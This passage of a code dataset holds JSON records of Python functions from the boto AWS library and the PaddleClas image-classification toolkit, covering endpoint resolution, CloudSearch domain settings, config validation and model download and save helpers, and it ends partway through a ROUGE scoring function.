{"docstring": "\"\"\"\nReturn a list of index fields defined for this domain.\n:return: list of IndexFieldStatus objects\n:rtype: list of :class:`boto.cloudsearch2.option.IndexFieldStatus`\n    object\n\"\"\"\n", "func_signal": "def get_index_fields(self, field_names=None):\n", "code": "data = self.layer1.describe_index_fields(self.name, field_names)\n\ndata = (data['DescribeIndexFieldsResponse']\n            ['DescribeIndexFieldsResult']\n            ['IndexFields'])\n\nreturn [IndexFieldStatus(self, d) for d in data]", "path": "boto/boto/cloudsearch2/domain.py", "commit_date": "2014-06-27 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"Get a list of all the available services in the endpoints file(s)\"\"\"\n", "func_signal": "def get_available_services(self):\n", "code": "services = set()\n\nfor partition in self._endpoint_data['partitions']:\n    services.update(partition['services'].keys())\n\nreturn [self._service_name(s) for s in services]", "path": "boto/boto/endpoints.py", "commit_date": "2017-02-09 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"Resolve the hostname for a service in a particular region.\n\n:type service_name: str\n:param service_name: The service to look up.\n\n:type region_name: str\n:param region_name: The region to find the endpoint for.\n\n:return: The hostname for the given service in the given region.\n\"\"\"\n", "func_signal": "def resolve_hostname(self, service_name, region_name):\n", "code": "endpoint = self._resolver.construct_endpoint(service_name, region_name)\nif endpoint is None:\n    return None\nreturn endpoint.get('sslCommonName', endpoint['hostname'])", "path": "boto/boto/endpoints.py", "commit_date": "2017-02-09 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"\nReturns size of file, optionally leaving fp positioned at EOF.\n\"\"\"\n", "func_signal": "def get_cur_file_size(fp, position_to_eof=False):\n", "code": "if isinstance(fp, KeyFile) and not position_to_eof:\n    # Avoid EOF seek for KeyFile case as it's very inefficient.\n    return fp.getkey().size\nif not position_to_eof:\n    cur_pos = fp.tell()\nfp.seek(0, os.SEEK_END)\ncur_file_size = fp.tell()\nif not position_to_eof:\n    fp.seek(cur_pos, os.SEEK_SET)\nreturn cur_file_size", "path": "boto/boto/s3/resumable_download_handler.py", "commit_date": "2014-06-27 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"\nGet all available regions for the Amazon EC2 Container Service.\n\n:rtype: list\n:return: A list of :class:`boto.regioninfo.RegionInfo`\n\"\"\"\n", "func_signal": "def regions():\n", "code": "from boto.ec2containerservice.layer1 import EC2ContainerServiceConnection\nreturn get_regions('ec2containerservice',\n                   connection_cls=EC2ContainerServiceConnection)", "path": "boto/boto/ec2containerservice/__init__.py", "commit_date": "2017-02-10 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"\nReturn a :class:`boto.cloudsearch2.option.ServicePoliciesStatus`\nobject representing the currently defined access policies for the\ndomain.\n:return: ServicePoliciesStatus object\n:rtype: :class:`boto.cloudsearch2.option.ServicePoliciesStatus` object\n\"\"\"\n", "func_signal": "def get_access_policies(self):\n", "code": "return ServicePoliciesStatus(\n    self, refresh_fn=self.layer1.describe_service_access_policies,\n    refresh_key=['DescribeServiceAccessPoliciesResponse',\n                 'DescribeServiceAccessPoliciesResult',\n                 'AccessPolicies'],\n    save_fn=self.layer1.update_service_access_policies)", "path": "boto/boto/cloudsearch2/domain.py", "commit_date": "2014-06-27 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"\n:type endpoint_data: dict\n:param endpoint_data: Regions and endpoints data in the same format\n    as is used by botocore / boto3.\n\n:type service_rename_map: dict\n:param service_rename_map: A mapping of boto2 service name to\n    endpoint prefix.\n\"\"\"\n", "func_signal": "def __init__(self, endpoint_data, service_rename_map=None):\n", "code": "super(_CompatEndpointResolver, self).__init__(endpoint_data)\nif service_rename_map is None:\n    service_rename_map = self._DEFAULT_SERVICE_RENAMES\n# Mapping of boto2 service name to endpoint prefix\nself._endpoint_prefix_map = service_rename_map\n# Mapping of endpoint prefix to boto2 service name\nself._service_name_map = dict(\n    (v, k) for k, v in service_rename_map.items())", "path": "boto/boto/endpoints.py", "commit_date": "2017-02-09 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"Build a set of static endpoints in the legacy boto2 format.\n\n:param service_names: The names of the services to build. They must\n    use the names that boto2 uses, not boto3, e.g \"ec2containerservice\"\n    and not \"ecs\". If no service names are provided, all available\n    services will be built.\n\n:return: A dict consisting of::\n    {\"service\": {\"region\": \"full.host.name\"}}\n\"\"\"\n", "func_signal": "def build_static_endpoints(self, service_names=None):\n", "code": "if service_names is None:\n    service_names = self._resolver.get_available_services()\n\nstatic_endpoints = {}\nfor name in service_names:\n    endpoints_for_service = self._build_endpoints_for_service(name)\n    if endpoints_for_service:\n        # It's possible that when we try to build endpoints for\n        # services we get an empty hash.  In that case we don't\n        # bother adding it to the final list of static endpoints.\n        static_endpoints[name] = endpoints_for_service\nself._handle_special_cases(static_endpoints)\nreturn static_endpoints", "path": "boto/boto/endpoints.py", "commit_date": "2017-02-09 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"\n:type endpoint_data: dict\n:param endpoint_data: Regions and endpoints data in the same format\n    as is used by botocore / boto3.\n\n:type service_rename_map: dict\n:param service_rename_map: A mapping of boto2 service name to\n    endpoint prefix.\n\"\"\"\n", "func_signal": "def __init__(self, endpoint_data, service_rename_map=None):\n", "code": "self._resolver = _CompatEndpointResolver(\n    endpoint_data, service_rename_map)", "path": "boto/boto/endpoints.py", "commit_date": "2017-02-09 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"Get partition information for a particular partition.\n\nThis should NOT be used to get service endpoint data because it only\nloads from the new endpoint format. It should only be used for\npartition metadata and partition specific service metadata.\n\n:type partition_name: str\n:param partition_name: The name of the partition to search for.\n\n:returns: Partition info from the new endpoints format.\n:rtype: dict or None\n\"\"\"\n", "func_signal": "def _get_partition_data(self, partition_name):\n", "code": "for partition in self._endpoint_data['partitions']:\n    if partition['partition'] == partition_name:\n        return partition\nraise ValueError(\n    \"Could not find partition data for: %s\" % partition_name)", "path": "boto/boto/endpoints.py", "commit_date": "2017-02-09 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"Determines whether a service uses a global endpoint.\n\nIn theory a service can be 'global' in one partition but regional in\nanother. In practice, each service is all global or all regional.\n\"\"\"\n", "func_signal": "def _is_global_service(self, service_name, partition_name='aws'):\n", "code": "endpoint_prefix = self._endpoint_prefix(service_name)\npartition = self._get_partition_data(partition_name)\nservice = partition['services'].get(endpoint_prefix, {})\nreturn 'partitionEndpoint' in service", "path": "boto/boto/endpoints.py", "commit_date": "2017-02-09 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"\nReturn a :class:`boto.cloudsearch2.option.ScalingParametersStatus`\nobject representing the currently defined scaling options for the\ndomain.\n:return: ScalingParametersStatus object\n:rtype: :class:`boto.cloudsearch2.option.ScalingParametersStatus`\n    object\n\"\"\"\n", "func_signal": "def get_scaling_options(self):\n", "code": "return ScalingParametersStatus(\n    self, refresh_fn=self.layer1.describe_scaling_parameters,\n    refresh_key=['DescribeScalingParametersResponse',\n                 'DescribeScalingParametersResult',\n                 'ScalingParameters'],\n    save_fn=self.layer1.update_scaling_parameters)", "path": "boto/boto/cloudsearch2/domain.py", "commit_date": "2014-06-27 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "# cloudsearchdomain endpoints use the exact same set of endpoints as\n# cloudsearch.\n", "func_signal": "def _handle_special_cases(self, static_endpoints):\n", "code": "if 'cloudsearch' in static_endpoints:\n    cloudsearch_endpoints = static_endpoints['cloudsearch']\n    static_endpoints['cloudsearchdomain'] = cloudsearch_endpoints", "path": "boto/boto/endpoints.py", "commit_date": "2017-02-09 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "# Given a service name, 'ec2', build a dict of\n# 'region' -> 'hostname'\n", "func_signal": "def _build_endpoints_for_service(self, service_name):\n", "code": "endpoints = {}\nregions = self._resolver.get_all_available_regions(service_name)\nfor region_name in regions:\n    endpoints[region_name] = self._resolver.resolve_hostname(\n        service_name, region_name)\nreturn endpoints", "path": "boto/boto/endpoints.py", "commit_date": "2017-02-09 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"\nCreate a new expression.\n\n:type name: string\n:param name: The name of an expression for processing\n    during a search request.\n\n:type value: string\n:param value: The expression to evaluate for ranking\n    or thresholding while processing a search request. The\n    Expression syntax is based on JavaScript expressions\n    and supports:\n\n    * Single value, sort enabled numeric fields (int, double, date)\n    * Other expressions\n    * The _score variable, which references a document's relevance\n      score\n    * The _time variable, which references the current epoch time\n    * Integer, floating point, hex, and octal literals\n    * Arithmetic operators: + - * / %\n    * Bitwise operators: | & ^ ~ << >> >>>\n    * Boolean operators (including the ternary operator): && || ! ?:\n    * Comparison operators: < <= == >= >\n    * Mathematical functions: abs ceil exp floor ln log2 log10 logn\n     max min pow sqrt pow\n    * Trigonometric functions: acos acosh asin asinh atan atan2 atanh\n     cos cosh sin sinh tanh tan\n    * The haversin distance function\n\n    Expressions always return an integer value from 0 to the maximum\n    64-bit signed integer value (2^63 - 1). Intermediate results are\n    calculated as double-precision floating point values and the return\n    value is rounded to the nearest integer. If the expression is\n    invalid or evaluates to a negative value, it returns 0. If the\n    expression evaluates to a value greater than the maximum, it\n    returns the maximum value.\n\n    The source data for an Expression can be the name of an\n    IndexField of type int or double, another Expression or the\n    reserved name _score. The _score source is\n    defined to return as a double from 0 to 10.0 (inclusive) to\n    indicate how relevant a document is to the search request,\n    taking into account repetition of search terms in the\n    document and proximity of search terms to each other in\n    each matching IndexField in the document.\n\n    For more information about using rank expressions to\n    customize ranking, see the Amazon CloudSearch Developer\n    Guide.\n\n:return: ExpressionStatus object\n:rtype: :class:`boto.cloudsearch2.option.ExpressionStatus` object\n\n:raises: BaseException, InternalException, LimitExceededException,\n    InvalidTypeException, ResourceNotFoundException\n\"\"\"\n", "func_signal": "def create_expression(self, name, value):\n", "code": "data = self.layer1.define_expression(self.name, name, value)\n\ndata = (data['DefineExpressionResponse']\n            ['DefineExpressionResult']\n            ['Expression'])\n\nreturn ExpressionStatus(self, data,\n                        self.layer1.describe_expressions)", "path": "boto/boto/cloudsearch2/domain.py", "commit_date": "2014-06-27 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"Retrieve every region across partitions for a service.\"\"\"\n", "func_signal": "def get_all_available_regions(self, service_name):\n", "code": "regions = set()\nendpoint_prefix = self._endpoint_prefix(service_name)\n\n# Get every region for every partition in the new endpoint format\nfor partition_name in self.get_available_partitions():\n    if self._is_global_service(service_name, partition_name):\n        # Global services are available in every region in the\n        # partition in which they are considered global.\n        partition = self._get_partition_data(partition_name)\n        regions.update(partition['regions'].keys())\n        continue\n    else:\n        regions.update(\n            self.get_available_endpoints(\n                endpoint_prefix, partition_name)\n        )\n\nreturn list(regions)", "path": "boto/boto/endpoints.py", "commit_date": "2017-02-09 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"\nReturn a list of rank expressions defined for this domain.\n:return: list of ExpressionStatus objects\n:rtype: list of :class:`boto.cloudsearch2.option.ExpressionStatus`\n    object\n\"\"\"\n", "func_signal": "def get_expressions(self, names=None):\n", "code": "fn = self.layer1.describe_expressions\ndata = fn(self.name, names)\n\ndata = (data['DescribeExpressionsResponse']\n            ['DescribeExpressionsResult']\n            ['Expressions'])\n\nreturn [ExpressionStatus(self, d, fn) for d in data]", "path": "boto/boto/cloudsearch2/domain.py", "commit_date": "2014-06-27 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"\nConstructor. Instantiate once for each downloaded file.\n\n:type tracker_file_name: string\n:param tracker_file_name: optional file name to save tracking info\n    about this download. If supplied and the current process fails\n    the download, it can be retried in a new process. If called\n    with an existing file containing an unexpired timestamp,\n    we'll resume the transfer for this file; else we'll start a\n    new resumable download.\n\n:type num_retries: int\n:param num_retries: the number of times we'll re-try a resumable\n    download making no progress. (Count resets every time we get\n    progress, so download can span many more than this number of\n    retries.)\n\"\"\"\n", "func_signal": "def __init__(self, tracker_file_name=None, num_retries=None):\n", "code": "self.tracker_file_name = tracker_file_name\nself.num_retries = num_retries\nself.etag_value_for_current_download = None\nif tracker_file_name:\n    self._load_tracker_file_etag()\n# Save download_start_point in instance state so caller can\n# find how much was transferred by this ResumableDownloadHandler\n# (across retries).\nself.download_start_point = None", "path": "boto/boto/s3/resumable_download_handler.py", "commit_date": "2014-06-27 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"\nLog error and exit when using paddlepaddle cpu version.\n\"\"\"\n", "func_signal": "def check_gpu():\n", "code": "err = \"You are using paddlepaddle cpu version! Please try to \" \\\n      \"install paddlepaddle-gpu to run model on GPU.\"\n\ntry:\n    assert is_compiled_with_cuda()\nexcept AssertionError:\n    logger.error(err)\n    sys.exit(1)", "path": "PaddleClas/ppcls/utils/check.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\nLog error and exit when the installed version of paddlepaddle is\nnot satisfied.\n\"\"\"\n", "func_signal": "def check_version():\n", "code": "err = \"PaddlePaddle version 1.8.0 or higher is required, \" \\\n      \"or a suitable develop version is satisfied as well. \\n\" \\\n      \"Please make sure the version is good with your code.\"\ntry:\n    pass\n    # paddle.utils.require_version('0.0.0')\nexcept Exception:\n    logger.error(err)\n    sys.exit(1)", "path": "PaddleClas/ppcls/utils/check.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\ncheck mix parameter\n\"\"\"\n", "func_signal": "def check_mix(architecture, use_mix=False):\n", "code": "err = \"Cannot use mix processing in GoogLeNet, \" \\\n      \"please set use_mix = False.\"\ntry:\n    if architecture[\"name\"] == \"GoogLeNet\":\n        assert use_mix is not True\nexcept AssertionError:\n    logger.error(err)\n    sys.exit(1)", "path": "PaddleClas/ppcls/utils/check.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\nGet the pretrained model.\n\"\"\"\n", "func_signal": "def get(architecture, path, decompress=False, postfix=\"pdparams\"):\n", "code": "_check_pretrained_name(architecture)\nurl = _get_url(architecture, postfix=postfix)\nfname = _download(url, path)\nif postfix == \"tar\" and decompress:\n    _decompress(fname)\nlogger.info(\"download {} finished \".format(fname))", "path": "PaddleClas/ppcls/utils/model_zoo.py", "commit_date": "2020-12-17 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\ncheck cata_dir\n\"\"\"\n", "func_signal": "def check_data_dir(path):\n", "code": "err = \"Data path is not exist, please given a right path\" \\\n      \"\".format(path)\ntry:\n    assert os.isdir(path)\nexcept AssertionError:\n    logger.error(err)\n    sys.exit(1)", "path": "PaddleClas/ppcls/utils/check.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\ninitialize with the necessary elements\n\"\"\"\n", "func_signal": "def __init__(self, use_gpu=None, enable_mkldnn=None):\n", "code": "cfg = read_params()\nif use_gpu is not None:\n    cfg.use_gpu = use_gpu\nif enable_mkldnn is not None:\n    cfg.enable_mkldnn = enable_mkldnn\ncfg.hubserving = True\ncfg.enable_benchmark = False\nself.args = cfg\nif cfg.use_gpu:\n    try:\n        _places = os.environ[\"CUDA_VISIBLE_DEVICES\"]\n        int(_places[0])\n        print(\"Use GPU, GPU Memery:{}\".format(cfg.gpu_mem))\n        print(\"CUDA_VISIBLE_DEVICES: \", _places)\n    except:\n        raise RuntimeError(\n            \"Environment Variable CUDA_VISIBLE_DEVICES is not set correctly. If you wanna use gpu, please set CUDA_VISIBLE_DEVICES via export CUDA_VISIBLE_DEVICES=cuda_device_id.\"\n        )\nelse:\n    print(\"Use CPU\")\n    print(\"Enable MKL-DNN\") if enable_mkldnn else None\nself.predictor = create_paddle_predictor(self.args)", "path": "PaddleClas/deploy/hubserving/clas/module.py", "commit_date": "2020-12-30 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\nRecursively override the config\n\nArgs:\n    config(dict): dict to be replaced\n    options(list): list of pairs(key0.key1.idx.key2=value)\n        such as: [\n            'topk=2',\n            'VALID.transforms.1.ResizeImage.resize_short=300'\n        ]\n\nReturns:\n    config(dict): replaced config\n\"\"\"\n", "func_signal": "def override_config(config, options=None):\n", "code": "if options is not None:\n    for opt in options:\n        assert isinstance(opt, str), (\n            \"option({}) should be a str\".format(opt))\n        assert \"=\" in opt, (\n            \"option({}) should contain a =\"\n            \"to distinguish between key and value\".format(opt))\n        pair = opt.split('=')\n        assert len(pair) == 2, (\"there can be only a = in the option\")\n        key, value = pair\n        keys = key.split('.')\n        override(config, keys, value)\n\nreturn config", "path": "PaddleClas/ppcls/utils/config.py", "commit_date": "2020-10-21 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\nload model from checkpoint or pretrained_model\n\"\"\"\n", "func_signal": "def init_model(config, net, optimizer=None):\n", "code": "checkpoints = config.get('checkpoints')\nif checkpoints:\n    assert os.path.exists(checkpoints + \".pdparams\"), \\\n        \"Given dir {}.pdparams not exist.\".format(checkpoints)\n    assert os.path.exists(checkpoints + \".pdopt\"), \\\n        \"Given dir {}.pdopt not exist.\".format(checkpoints)\n    para_dict = paddle.load(checkpoints + \".pdparams\")\n    opti_dict = paddle.load(checkpoints + \".pdopt\")\n    net.set_dict(para_dict)\n    optimizer.set_state_dict(opti_dict)\n    logger.info(\n        logger.coloring(\"Finish initing model from {}\".format(checkpoints),\n                        \"HEADER\"))\n    return\n\npretrained_model = config.get('pretrained_model')\nload_static_weights = config.get('load_static_weights', False)\nuse_distillation = config.get('use_distillation', False)\nif pretrained_model:\n    if isinstance(pretrained_model,\n                  list):  # load distillation pretrained model\n        if not isinstance(load_static_weights, list):\n            load_static_weights = [load_static_weights] * len(\n                pretrained_model)\n        load_distillation_model(net, pretrained_model, load_static_weights)\n    else:  # common load\n        load_dygraph_pretrain(\n            net,\n            path=pretrained_model,\n            load_static_weights=load_static_weights)\n        logger.info(\n            logger.coloring(\"Finish initing model from {}\".format(\n                pretrained_model), \"HEADER\"))", "path": "PaddleClas/ppcls/utils/save_load.py", "commit_date": "2020-11-21 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\nvisualize configs\n\nArguments:\n    config: configs\n\"\"\"\n", "func_signal": "def print_config(config):\n", "code": "logger.advertise()\nprint_dict(config)", "path": "PaddleClas/ppcls/utils/config.py", "commit_date": "2020-10-21 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\" update \"\"\"\n", "func_signal": "def update(self, val, n=1):\n", "code": "self.val = val\nself.sum += val * n\nself.count += n\nself.avg = self.sum / self.count", "path": "PaddleClas/ppcls/utils/misc.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\nMove src directory to dst, if dst is already exists,\nmerge src to dst\n\"\"\"\n", "func_signal": "def _move_and_merge_tree(src, dst):\n", "code": "if not os.path.exists(dst):\n    shutil.move(src, dst)\nelif os.path.isfile(src):\n    shutil.move(src, dst)\nelse:\n    for fp in os.listdir(src):\n        src_fp = os.path.join(src, fp)\n        dst_fp = os.path.join(dst, fp)\n        if os.path.isdir(src_fp):\n            if os.path.isdir(dst_fp):\n                _move_and_merge_tree(src_fp, dst_fp)\n            else:\n                shutil.move(src_fp, dst_fp)\n        elif os.path.isfile(src_fp) and \\\n                not os.path.isfile(dst_fp):\n            shutil.move(src_fp, dst_fp)", "path": "PaddleClas/ppcls/utils/model_zoo.py", "commit_date": "2020-12-17 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\nmkdir if not exists, ignore the exception when multiprocess mkdir together\n\"\"\"\n", "func_signal": "def _mkdir_if_not_exist(path):\n", "code": "if not os.path.exists(path):\n    try:\n        os.makedirs(path)\n    except OSError as e:\n        if e.errno == errno.EEXIST and os.path.isdir(path):\n            logger.warning(\n                'be happy if some process has already created {}'.format(\n                    path))\n        else:\n            raise OSError('Failed to mkdir {}'.format(path))", "path": "PaddleClas/ppcls/utils/save_load.py", "commit_date": "2020-11-21 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\n\nArgs:\n    images (list(numpy.ndarray)): images data, shape of each is [H, W, C]. If images not paths\n    paths (list[str]): The paths of images. If paths not images\nReturns:\n    res (list): The result of chinese texts and save path of images.\n\"\"\"\n\n", "func_signal": "def predict(self, images=[], paths=[], top_k=1):\n", "code": "if images != [] and isinstance(images, list) and paths == []:\n    predicted_data = images\nelif images == [] and isinstance(paths, list) and paths != []:\n    predicted_data = self.read_images(paths)\nelse:\n    raise TypeError(\n        \"The input data is inconsistent with expectations.\")\n\nassert predicted_data != [], \"There is not any image to be predicted. Please check the input data.\"\n\nall_results = []\nfor img in predicted_data:\n    if img is None:\n        logger.info(\"error in loading image\")\n        all_results.append([])\n        continue\n\n    self.args.image_file = img\n    self.args.top_k = top_k\n\n    starttime = time.time()\n    classes, scores = paddle_predict.predict(self.args, self.predictor)\n    elapse = time.time() - starttime\n\n    logger.info(\"Predict time: {}\".format(elapse))\n    all_results.append([classes.tolist(), scores.tolist(), elapse])\nreturn all_results", "path": "PaddleClas/deploy/hubserving/clas/module.py", "commit_date": "2020-12-30 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\ncheck classes_num\n\"\"\"\n", "func_signal": "def check_classes_num(classes_num):\n", "code": "err = \"classes_num({}) should be a positive integer\" \\\n    \"and larger than 1\".format(classes_num)\ntry:\n    assert isinstance(classes_num, int)\n    assert classes_num > 1\nexcept AssertionError:\n    logger.error(err)\n    sys.exit(1)", "path": "PaddleClas/ppcls/utils/check.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\nDecompress for zip and tar file\n\"\"\"\n", "func_signal": "def _decompress(fname):\n", "code": "logger.info(\"Decompressing {}...\".format(fname))\n\n# For protecting decompressing interupted,\n# decompress to fpath_tmp directory firstly, if decompress\n# successed, move decompress files to fpath and delete\n# fpath_tmp and remove download compress file.\nfpath = os.path.split(fname)[0]\nfpath_tmp = os.path.join(fpath, 'tmp')\nif os.path.isdir(fpath_tmp):\n    shutil.rmtree(fpath_tmp)\n    os.makedirs(fpath_tmp)\n\nif fname.find('tar') >= 0:\n    with tarfile.open(fname) as tf:\n        tf.extractall(path=fpath_tmp)\nelif fname.find('zip') >= 0:\n    with zipfile.ZipFile(fname) as zf:\n        zf.extractall(path=fpath_tmp)\nelse:\n    raise TypeError(\"Unsupport compress file type {}\".format(fname))\n\nfs = os.listdir(fpath_tmp)\nassert len(\n    fs\n) == 1, \"There should just be 1 pretrained path in an archive file but got {}.\".format(\n    len(fs))\n\nf = fs[0]\nsrc_dir = os.path.join(fpath_tmp, f)\ndst_dir = os.path.join(fpath, f)\n_move_and_merge_tree(src_dir, dst_dir)\n\nshutil.rmtree(fpath_tmp)\nos.remove(fname)\n\nreturn f", "path": "PaddleClas/ppcls/utils/model_zoo.py", "commit_date": "2020-12-17 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\nRun as a service.\n\"\"\"\n", "func_signal": "def serving_method(self, images, **kwargs):\n", "code": "to_cv2 = Base64ToCV2()\nimages_decode = [to_cv2(image) for image in images]\nresults = self.predict(images_decode, **kwargs)\nreturn results", "path": "PaddleClas/deploy/hubserving/clas/module.py", "commit_date": "2020-12-30 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"Load a config file into AttrDict\"\"\"\n", "func_signal": "def parse_config(cfg_file):\n", "code": "with open(cfg_file, 'r') as fopen:\n    yaml_config = AttrDict(yaml.load(fopen, Loader=yaml.SafeLoader))\ncreate_attr_dict(yaml_config)\nreturn yaml_config", "path": "PaddleClas/ppcls/utils/config.py", "commit_date": "2020-10-21 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\ncheck specify config\n\"\"\"\n", "func_signal": "def check_function_params(config, key):\n", "code": "k_config = config.get(key)\nassert k_config is not None, \\\n    ('{} is required in config'.format(key))\n\nassert k_config.get('function'), \\\n    ('function is required {} config'.format(key))\nparams = k_config.get('params')\nassert params is not None, \\\n    ('params is required in {} config'.format(key))\nassert isinstance(params, dict), \\\n    ('the params in {} config should be a dict'.format(key))", "path": "PaddleClas/ppcls/utils/check.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\ncheck architecture and recommend similar architectures\n\"\"\"\n", "func_signal": "def check_architecture(architecture):\n", "code": "assert isinstance(architecture, dict), \\\n    (\"the type of architecture({}) should be dict\". format(architecture))\nassert \"name\" in architecture, \\\n    (\"name must be in the architecture keys, just contains: {}\". format(\n        architecture.keys()))\n\nsimilar_names = similar_architectures(architecture[\"name\"],\n                                      get_architectures())\nmodel_list = ', '.join(similar_names)\nerr = \"Architecture [{}] is not exist! Maybe you want: [{}]\" \\\n      \"\".format(architecture[\"name\"], model_list)\ntry:\n    assert architecture[\"name\"] in similar_names\nexcept AssertionError:\n    logger.error(err)\n    sys.exit(1)", "path": "PaddleClas/ppcls/utils/check.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\nsave model to the target path\n\"\"\"\n", "func_signal": "def save_model(net, optimizer, model_path, epoch_id, prefix='ppcls'):\n", "code": "if paddle.distributed.get_rank() != 0:\n    return\nmodel_path = os.path.join(model_path, str(epoch_id))\n_mkdir_if_not_exist(model_path)\nmodel_prefix = os.path.join(model_path, prefix)\n\npaddle.save(net.state_dict(), model_prefix + \".pdparams\")\npaddle.save(optimizer.state_dict(), model_prefix + \".pdopt\")\nlogger.info(\n    logger.coloring(\"Already save model in {}\".format(model_path),\n                    \"HEADER\"))", "path": "PaddleClas/ppcls/utils/save_load.py", "commit_date": "2020-11-21 00:00:00", "repo_name": "PaddlePaddle/PaddleClas", "stars": 5198, "license": "apache-2.0", "language": "python", "size": 224789}
{"docstring": "\"\"\"\nComputes ROUGE scores using the python wrapper\n(https://github.com/bheinzerling/pyrouge) of perl ROUGE package.\n\nArgs:\n    cand (list or str): If `is_input_files` is `False`, `cand` is a list of strings\n        containing predicted summaries. if `is_input_files` is `True`, `cand` is the path\n        to the file containing the predicted summaries.\n    ref (list or str): If `is_input_files` is `False`, `cand` is a list of strings\n        containing reference summaries. if `is_input_files` is `True`, `cand` is the path\n        to the file containing the reference summaries.\n    is_input_files (bool, optional): If True, inputs are file names. Otherwise, inputs are lists\n        of predicted and reference summaries. Defaults to False.\n    verbose (bool, optional): If True, print out all rouge scores. Defaults to False.\n\nReturns:\n    dict: Dictionary of ROUGE scores.\n\n\"\"\"\n\n", "func_signal": "def compute_rouge_perl(cand, ref, is_input_files=False, verbose=False):\n", "code": "temp_dir = tempfile.mkdtemp()\n\nif is_input_files:\n    candidates = [line.strip() for line in open(cand, encoding=\"utf-8\")]\n    references = [line.strip() for line in open(ref, encoding=\"utf-8\")]\nelse:\n    candidates = cand\n    references = ref\n\nprint(\"Number of candidates: {}\".format(len(candidates)))\nprint(\"Number of references: {}\".format(len(references)))\nassert len(candidates) == len(references)\n\ncnt = len(candidates)\ncurrent_time = time.strftime(\"%Y-%m-%d-%H-%M-%S\", time.localtime())\ntmp_dir = os.path.join(temp_dir, \"rouge-tmp-{}\".format(current_time))\n\ntmp_dir_candidate = tmp_dir + 